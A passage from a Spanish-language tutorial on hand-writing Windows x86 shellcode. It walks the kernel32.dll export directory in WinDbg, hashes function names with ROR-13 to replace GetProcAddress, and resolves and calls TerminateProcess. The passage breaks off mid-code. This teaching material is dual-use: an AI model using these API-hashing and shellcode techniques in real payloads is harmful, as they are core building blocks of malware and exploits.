<p><code>DataDirectory</code> es una matriz con una longitud de 16, cada entrada de esta matriz es una estructura.</p>
<p>El prototipo de la estructura <code>_IMAGE_DATA_DIRECTORY</code> es:</p>
<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-storage z-type z-c">typedef</span> <span class="z-storage z-type z-c">struct</span> _IMAGE_DATA_DIRECTORY <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> VirtualAddress<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> <span class="z-support z-type z-mac-classic z-c">Size</span><span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span> IMAGE_DATA_DIRECTORY<span class="z-punctuation z-separator z-c">,</span> <span class="z-keyword z-operator z-c">*</span><span class="z-entity z-name z-type z-typedef z-c">PIMAGE_DATA_DIRECTORY</span><span class="z-punctuation z-terminator z-c">;</span>
</span></code></pre>
<p>Vemos que la estructura <code>_IMAGE_OPTIONAL_HEADER</code>, se encuentra en el desplazamiento <code>0x18</code> desde el encabezado PE y <code>DataDirectory</code> se encuentra en un desplazamiento de <code>0x60</code>.</p>
<p>De esta manera, confirmamos que el valor de la EDT es <code>0x60 + 0x18 = 0x78</code>, que es el valor que habíamos establecido anteriormente.</p>
<p>Volcaremos la estructura en WinDBG para obtener el RVA de la tabla de directorio de exportación.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; dx -r1 (*((ntdll!_IMAGE_DATA_DIRECTORY (*)[16])0x76c20160))
</span><span class="z-text z-plain">(*((ntdll!_IMAGE_DATA_DIRECTORY (*)[16])0x76c20160))                 [Type: _IMAGE_DATA_DIRECTORY [16]]
</span><span class="z-text z-plain">    [0]              [Type: _IMAGE_DATA_DIRECTORY]
</span><span class="z-text z-plain">    [1]              [Type: _IMAGE_DATA_DIRECTORY]
</span><span class="z-text z-plain">...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dx -r1 (*((ntdll!_IMAGE_DATA_DIRECTORY *)0x76c20160))
</span><span class="z-text z-plain">(*((ntdll!_IMAGE_DATA_DIRECTORY *)0x76c20160))                 [Type: _IMAGE_DATA_DIRECTORY]
</span><span class="z-text z-plain">    [+0x000] VirtualAddress   : 0x7b9f0 [Type: unsigned long]
</span><span class="z-text z-plain">    [+0x004] Size             : 0xdca6 [Type: unsigned long]
</span><span class="z-text z-plain">
</span></code></pre>
<p>Si usamos <code>dh</code>, podremos que la dirección coincide.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; !dh -f kernel32
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">File Type: DLL
</span><span class="z-text z-plain">FILE HEADER VALUES
</span><span class="z-text z-plain">     14C machine (i386)
</span><span class="z-text z-plain">       6 number of sections
</span><span class="z-text z-plain">E5092278 time date stamp
</span><span class="z-text z-plain">       0 file pointer to symbol table
</span><span class="z-text z-plain">       0 number of symbols
</span><span class="z-text z-plain">      E0 size of optional header
</span><span class="z-text z-plain">    2102 characteristics
</span><span class="z-text z-plain">            Executable
</span><span class="z-text z-plain">            32 bit word machine
</span><span class="z-text z-plain">            DLL
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">OPTIONAL HEADER VALUES
</span><span class="z-text z-plain">     10B magic #
</span><span class="z-text z-plain">   14.20 linker version
</span><span class="z-text z-plain">   89000 size of code
</span><span class="z-text z-plain">   13000 size of initialized data
</span><span class="z-text z-plain">       0 size of uninitialized data
</span><span class="z-text z-plain">   1D890 address of entry point
</span><span class="z-text z-plain">    1000 base of code
</span><span class="z-text z-plain">         ----- new -----
</span><span class="z-text z-plain">76c00000 image base
</span><span class="z-text z-plain">    1000 section alignment
</span><span class="z-text z-plain">    1000 file alignment
</span><span class="z-text z-plain">       3 subsystem (Windows CUI)
</span><span class="z-text z-plain">   10.00 operating system version
</span><span class="z-text z-plain">   10.00 image version
</span><span class="z-text z-plain">   10.00 subsystem version
</span><span class="z-text z-plain">   9D000 size of image
</span><span class="z-text z-plain">    1000 size of headers
</span><span class="z-text z-plain">   B003F checksum
</span><span class="z-text z-plain">00040000 size of stack reserve
</span><span class="z-text z-plain">00001000 size of stack commit
</span><span class="z-text z-plain">00100000 size of heap reserve
</span><span class="z-text z-plain">00001000 size of heap commit
</span><span class="z-text z-plain">    4140  DLL characteristics
</span><span class="z-text z-plain">            Dynamic base
</span><span class="z-text z-plain">            NX compatible
</span><span class="z-text z-plain">            Guard
</span><span class="z-text z-plain">   7B9F0 [    DCA6] address [size] of Export Directory
</span><span class="z-text z-plain">   8C4F0 [     794] address [size] of Import Directory
</span><span class="z-text z-plain">   97000 [     520] address [size] of Resource Directory
</span><span class="z-text z-plain">...
</span></code></pre>
<p>Hemos obtenido la dirección virtual relativa de la tabla de directorios de exportación, así que determinemos si nuestro shellcode recupera el mismo valor. Podemos recorrer paso a paso las instrucciones del shellcode dentro de WinDbg y comprobar el valor de EDI antes de
añadirle la dirección base de kernel32.dll.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=000000e8 ebx=76c00000 ecx=00000000 edx=00750000 esi=00778858 edi=007722f0
</span><span class="z-text z-plain">eip=00750032 esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00750032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] ds:0023:76c00160=0007b9f0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; t
</span><span class="z-text z-plain">eax=000000e8 ebx=76c00000 ecx=00000000 edx=00750000 esi=00778858 edi=0007b9f0
</span><span class="z-text z-plain">eip=00750036 esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00750036 01df            add     edi,ebx
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; r edi
</span><span class="z-text z-plain">edi=0007b9f0
</span></code></pre>
<p>Como podemos apreciar, se ha obtenido la dirección correcta de la tabla de directorios de exportación, si llegamos al final de la función <code>find_function_finished</code>, vemos como ESI apunta al último módulo exportado por <code>kernel32.dll</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">...
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=76c7d33c ebx=76c00000 ecx=00000648 edx=00750000 esi=76c8968a edi=76c7b9f0
</span><span class="z-text z-plain">eip=0075004e esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">0075004e 61              popad
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; da esi
</span><span class="z-text z-plain">76c8968a  &quot;timeGetTime&quot;
</span></code></pre>
<p>Para ver todas las funciones exportadas se puede hacer de la siguiente manera:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; !dh kernel32 -e
</span><span class="z-text z-plain">_IMAGE_EXPORT_DIRECTORY 76c7b9f0 (size: 0000dca6)
</span><span class="z-text z-plain">Name: KERNEL32.dll 
</span><span class="z-text z-plain">Characteristics: 00000000 Ordinal base: 1.
</span><span class="z-text z-plain">Number of Functions: 1609. Number of names: 1609. EAT: 76c7ba18.
</span><span class="z-text z-plain">   ordinal hint target   name
</span><span class="z-text z-plain">      ...
</span><span class="z-text z-plain">         8    5 76C1B920 AddAtomW
</span><span class="z-text z-plain">         9    6 76C2E190 AddConsoleAliasA
</span><span class="z-text z-plain">      1571 1570 76C43AD0 WriteProcessMemory
</span><span class="z-text z-plain">      ...
</span><span class="z-text z-plain">      1609 1608 76C28B80 timeGetTime
</span></code></pre>
<h2 id="calcular-el-hash-del-nombre-de-una-funcion">Calcular el hash del nombre de una función<a class="zola-anchor" href="#calcular-el-hash-del-nombre-de-una-funcion" aria-label="Anchor link for: calcular-el-hash-del-nombre-de-una-funcion" style="visibility: hidden;"></a>
</h2>
<p>Después de obtener la dirección de la matriz <code>ArrayofNames</code>, estamos preparados para buscar otros símbolos.</p>
<p>Se usará un algoritmo hash para buscar el símbolo deseado en la matriz en lugar de la longitud de la cadena o varias partes del nombre del símbolo, estas funciones harán lo mismo que <code>GetProcAddress</code>.</p>
<p>El algorito hash, convierte cualquuier cadena a un DWORD. Esto nos permite reutilizar la función para cualquier símbolo que queramos, cada cadena generará un DWORD único.</p>
<p>El último paso de nuesto shellcode, obtenía la primera entrada en <code>ArrayofNames</code> y convertía el RVA en un VMA con el registro ESI apuntando al nombre del símbolo.</p>
<p>Implementaremos 3 funciones nuevas:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">compute_hash:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> NULL EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cdq<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> NULL EDX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cld<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> limpiar bandera de direccion
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">compute_hash_again:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">lodsb<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Carga el siguiente byte de ESI en AL
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">test al, al<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>              <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Comprueba el terminador nulo
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jz compute_hash_finished<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Si AL == 0, hemos dado con el nulo y salta
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ror edx, 0x0d<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Rota EDX 13 bits a al derecha
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add edx, eax<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Añade el nuevo byte al acumulador
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jmp compute_hash_again<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>   <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> siguiente interación
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">compute_hash_finished:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></code></pre>
<p>La instrucción <code>CDQ</code> convierte un entero con signo de 32 bits (en <code>EAX</code>) en uno de 64 bits (en <code>EDX:EAX</code>), extendiendo el bit de signo de <code>EAX</code> a todo el registro <code>EDX</code>.</p>
<p>Esto garantiza que ambos registros están en cero de forma compacta. Es una técnica común denominada "zeroing".</p>
<p>La función <code>compute_hash</code>, comienza con una operación xor, que establece el registro EAX en nulo. Esta instrucción es seguida por la instrucción <code>cdq</code>, que utiliza el valor nulo en EAX para establecer EDX en nulo también.</p>
<p>LA última instrucción de esta función es <code>cld</code>, la cuál es encargada de limpiar la bandera de dirección (DF) en el registro eflags.
Ejecutar esta instrucción hará que todas las operaciones con Instrucciones de cadenas se incrementen los registros de índice, que son ESI/EDI.</p>
<p>Esto <strong>garantiza que operaciones como <code>LODSB</code> avancen hacia adelante</strong>, es decir:</p>
<ul>
<li><code>lodsb</code> carga un byte desde <code>[ESI]</code> en <code>AL</code>, luego incrementa ESI.</li>
</ul>
<p>Si por alguna razón la bandera DF estuviera en 1, <code>lodsb</code> decrementaría <code>ESI</code>, y recorrerías la cadena al revés.</p>
<p>Luego llegamos a la función <code>compute_hash_again</code>, que comienza con la instrucción <code>lodsb</code>.</p>
<p>Esta instrucción cargará un byte de la memoria apuntada por ESI en el registro AL y luego incrementará o decrementará en base a la bandera DF. Le sigue una instrucción <code>test</code> que prueba si AL es nulo, saltará a <code>compute_hash_finished</code>, esta es una función vacía para usarla como marcador para el salto.</p>
<p>Si AL no es nulo, se obtiene una operación <code>ROR</code> bit a bit. Esta instrucción de ensamblaje rota los bits del primer operando a la derecha el número de posiciones de bit especificado en el segundo operando. En nuestro caso, EDX se rota a la derecha <code>0x0D</code>(13) bits.</p>
<p>Tras esta instrucción, añadiremos el valor de EAX en EDX y saltaremos al principio de <code>compute_hash_again</code>, está funcíon es un bucle que recorer cada byte del nombre del símbolo y lo añade a EDX justo después de la operación ror.</p>
<p>Al llegar al final del nombre de nuestro símbolo, el registro EDX contendrá un hash único de cuatro bytes para dicho símbolo. Esto significa que podemos compararlo con un hash pregenerado para determinar si hemos encontrado la entrada correcta.</p>
<p>Para hacer una comprobación, podemos emplear un script de python que en base al símbolo nos proporcione el hash único:</p>
<pre class="z-code"><code><span class="z-text z-plain">$ python computehash.py timeGetTime
</span><span class="z-text z-plain">0x998eaf95
</span></code></pre>
<p>Colcaremos un breakpoint en la función <code>find_function</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; bp 00ea002e
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=020cffcc ebx=76c00000 ecx=00000000 edx=00ea0000 esi=000f5a28 edi=000f22f0
</span><span class="z-text z-plain">eip=00ea002e esp=020cfd70 ebp=020cff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00ea002e 60              pushad
</span></code></pre>
<p>Pondremos unos puntos de interrupción en <code>xor eax, eax</code> que se establece en nulo después de obtener el RVA de la primera entrada de <code>AddressOfName</code>, lo que permite ver que símbolo se va a codificar.</p>
<p>EL segundo se establece después de ejecutar <code>compute_hash_again</code>, la función ha terminado de ejecutarse, lo que nos permite ver el resultado del hash en EDX.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; u @eip l18
</span><span class="z-text z-plain">00ea002e 60              pushad
</span><span class="z-text z-plain">00ea002f 8b433c          mov     eax,dword ptr [ebx+3Ch]
</span><span class="z-text z-plain">00ea0032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
</span><span class="z-text z-plain">00ea0036 01df            add     edi,ebx
</span><span class="z-text z-plain">00ea0038 8b4f18          mov     ecx,dword ptr [edi+18h]
</span><span class="z-text z-plain">00ea003b 8b4720          mov     eax,dword ptr [edi+20h]
</span><span class="z-text z-plain">00ea003e 01d8            add     eax,ebx
</span><span class="z-text z-plain">00ea0040 8945fc          mov     dword ptr [ebp-4],eax
</span><span class="z-text z-plain">00ea0043 e309            jecxz   00ea004e
</span><span class="z-text z-plain">00ea0045 49              dec     ecx
</span><span class="z-text z-plain">00ea0046 8b45fc          mov     eax,dword ptr [ebp-4]
</span><span class="z-text z-plain">00ea0049 8b3488          mov     esi,dword ptr [eax+ecx*4]
</span><span class="z-text z-plain">00ea004c 01de            add     esi,ebx
</span><span class="z-text z-plain">00ea004e 31c0            xor     eax,eax
</span><span class="z-text z-plain">00ea0050 99              cdq
</span><span class="z-text z-plain">00ea0051 fc              cld
</span><span class="z-text z-plain">00ea0052 ac              lods    byte ptr [esi]
</span><span class="z-text z-plain">00ea0053 84c0            test    al,al
</span><span class="z-text z-plain">00ea0055 7407            je      00ea005e
</span><span class="z-text z-plain">00ea0057 c1ca0d          ror     edx,0Dh
</span><span class="z-text z-plain">00ea005a 01c2            add     edx,eax
</span><span class="z-text z-plain">00ea005c ebf4            jmp     00ea0052
</span><span class="z-text z-plain">00ea005e 61              popad
</span><span class="z-text z-plain">00ea005f c3              ret
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; bp 00ea004e
</span><span class="z-text z-plain">0:004&gt; bp 00ea005e
</span><span class="z-text z-plain">0:004&gt; bl
</span><span class="z-text z-plain">     0 d Enable Clear  00ea002e     0001 (0001)  0:**** 
</span><span class="z-text z-plain">     1 e Disable Clear  00ea004e     0001 (0001)  0:**** 
</span><span class="z-text z-plain">     2 e Disable Clear  00ea005e     0001 (0001)  0:**** 
</span></code></pre>
<p>Como se puede apreciar en el siguiente Ouput de Windbg, coincide con nuestro script de python.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 1 hit
</span><span class="z-text z-plain">eax=76c7d33c ebx=76c00000 ecx=00000648 edx=00ea0000 esi=76c8968a edi=76c7b9f0
</span><span class="z-text z-plain">eip=00ea004e esp=020cfd50 ebp=020cff74 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">00ea004e 31c0            xor     eax,eax
</span><span class="z-text z-plain">0:004&gt; da @esi
</span><span class="z-text z-plain">76c8968a  &quot;timeGetTime&quot;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 2 hit
</span><span class="z-text z-plain">eax=00000000 ebx=76c00000 ecx=00000648 edx=998eaf95 esi=76c89696 edi=76c7b9f0
</span><span class="z-text z-plain">eip=00ea005e esp=020cfd50 ebp=020cff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00ea005e 61              popad
</span><span class="z-text z-plain">0:004&gt; r edx
</span><span class="z-text z-plain">edx=998eaf95
</span></code></pre>
<p>Ahora que hemos implementado el algoritmo, debemos saber cómo obtener el RVA y VMA del símbolo para poder usarlo en nuestro shellcode.</p>
<h3 id="obtener-vma-de-una-funcion">Obtener VMA de una función<a class="zola-anchor" href="#obtener-vma-de-una-funcion" aria-label="Anchor link for: obtener-vma-de-una-funcion" style="visibility: hidden;"></a>
</h3>
<p>Una vez que llegamos a la última instrucción de nuestro shellcode anterior, el hash calculado se almacena en el registro EDX.</p>
<p>Esto significa que podemos introducir una función adicional que comparará el hash de EDX con el generado por nuestro script de Python. Si los hashes coinciden, podemos reutilizar el mismo índice de ECX en el array AddressOfNameOrdinals y obtener el nuevo índice. Esto nos permitirá obtener el RVA y, finalmente, el VMA de la función.</p>
<pre class="z-code"><code><span class="z-text z-plain">$ python computehash.py TerminateProcess
</span><span class="z-text z-plain">0x78b5b983
</span></code></pre>
<p>El código quedaría de la siguiente manera:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">start:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">int3;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebp, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub esp, 0x200;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call find_kernel32;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x78b5b983;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> hash de teminateProcess
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call find_function;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> ecx nulo
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> uExitCode
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0xffffffff;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> hprocess
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Llamar a TerminateProcess
</span></span><span class="z-source z-python">     <span class="z-constant z-language z-python">...</span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_compare:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cmp edx, [esp+0x24];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Comparar el hash generado con el solicitado
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jnz find_function_loop;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Si no coincide vuelve a find_function_loop
</span></span><span class="z-source z-python">     <span class="z-constant z-language z-python">...</span>
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_finished:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">popad;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></code></pre>
<p>El primer cambioque tiene nuestro shellcode es la función de inicio, antes de llamar a <code>find_function</code>, mandamos a pila mediante <code>push</code> el hash de <code>TerminateProcess</code>, esto nos permite recuperarlo posteriormente y compararlo con la función.</p>
<p>Tras el retorno de <code>find_function</code>, insertamos en la pila los dos argumentos que requiere la función destino.</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-support z-type z-windows z-c">BOOL</span> <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">TerminateProcess</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
